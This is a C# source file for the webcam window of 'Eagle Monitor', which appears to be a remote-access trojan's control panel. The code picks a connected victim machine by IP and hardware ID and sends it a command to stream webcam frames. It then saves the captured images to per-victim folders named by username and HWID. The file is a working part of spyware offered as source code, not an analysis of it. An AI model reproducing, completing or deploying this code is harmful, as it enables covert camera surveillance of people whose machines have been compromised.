using Eagle_Monitor.Clients;
using Eagle_Monitor.Controls;
using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Forms
{
    public partial class WebCamForm : FormPattern
    {
        public string ClientHWID { get; set; }
        public string IP_Origin { get; set; }
        public bool HasToCapture { get; set; }

        public WebCamForm(string ClientHWID, string IP_Origin)
        {
            this.ClientHWID = ClientHWID;
            this.IP_Origin = IP_Origin;
            this.HasToCapture = false;
            InitializeComponent();
        }

        private void WebCamForm_Load(object sender, EventArgs e)
        {
          
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            try
            {
                pictureBox1.Image = Properties.Resources.icons8_not_sending_video_frames_32;
                this.loadingCircle1.Visible = false;
                this.loadingCircle1.Active = false;
                this.HasToCapture = false;
            }
            catch {}
            this.Close();
        }
        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }
        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked && webCamComboBox.Text != string.Empty)
            {
                pictureBox1.Image = Properties.Resources.icons8_showing_video_frames_32;
                this.loadingCircle1.Visible = true;
                this.loadingCircle1.Active = true;
                this.HasToCapture = true;
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.WebCam;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;    
                D.DataReturn = new object[] { Shared.PacketType.CAPTURE_CAMERA, webCamComboBox.SelectedIndex, quailitySiticoneTrackBar.Value };
                Task.Run(() => C.SendData(D.Serialize()));
            }
            else 
            {           
                pictureBox1.Image = Properties.Resources.icons8_not_sending_video_frames_32;
                this.loadingCircle1.Visible = false;
                this.loadingCircle1.Active = false;
                this.HasToCapture = false;
            }       
        }

        private void saveWindowsButton_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\" + "Pictures") == false)
                System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\"+ Client.ClientDictionary[this.IP_Origin].Username + this.ClientHWID + "\\" + "Pictures");

            string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
            try
            {
                System.IO.File.WriteAllBytes(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\Pictures\\" + Date + ".jpeg", Utilities.ImageToBytes(Client.ClientDictionary[this.IP_Origin].webCamForm.camPictureBox.Image));
            }
            catch (Exception ex) { MessageBox.Show(ex.ToString()); }
        }
    }
}
